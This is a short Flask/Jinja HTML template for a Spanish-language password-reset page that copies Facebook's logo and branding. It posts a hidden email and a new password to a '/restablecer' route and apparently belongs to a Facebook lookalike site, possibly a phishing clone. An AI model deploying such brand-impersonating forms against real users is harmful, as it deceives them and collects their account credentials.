<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="{{ url_for('static', filename='img/faceboook.ico') }}" rel="shortcut icon" sizes="196x196">
        <title>Restablecer contraseña</title>
        <link rel="stylesheet" href="{{ url_for('static', filename='css/cuenta_identificada.css') }}">
    </head>
<body>
    <div class="container">
        <img src="{{ url_for('static', filename='img/facebook-6.png') }}" alt="Logo de Facebook" class="logo">
        <h2>Restablecer tu contraseña</h2>
        <form action="/restablecer" method="post">
            <input type="hidden" name="correo" value="{{ correo }}">
            <input type="password" name="password" placeholder="Nueva contraseña" required>
            <input type="password" name="password" placeholder="Confirmar contraseña" required>
            <button type="submit">Restablecer Contraseña</button>
        </form>
        {% if error %}
          <p style="color: red;">{{ error }}</p>
        {% endif %}
    </div>
</body>
</html>
